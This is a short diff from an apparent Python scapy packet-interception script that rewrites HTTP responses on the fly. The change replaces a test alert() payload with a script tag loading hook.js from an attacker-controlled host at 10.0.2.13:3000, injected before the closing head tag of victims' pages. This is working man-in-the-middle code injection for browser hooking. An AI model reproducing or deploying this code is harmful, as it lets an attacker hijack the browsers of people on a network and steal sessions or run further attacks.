@@ -31,7 +31,8 @@ def process_packet(packet):
                 load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
             elif scapy_packet[sc.TCP].sport == 80:
                 # print(f'[+] Response > {load}')
-                injection_code = '<script>alert("test");</script>'
+                # injection_code = '<script>alert("test");</script>'
+                injection_code = '<script src="http://10.0.2.13:3000/hook.js"></script>'
                 load = load.replace(
                     # '</body>', injection_code + '</body>')
                     '</head>', injection_code + '</head>')
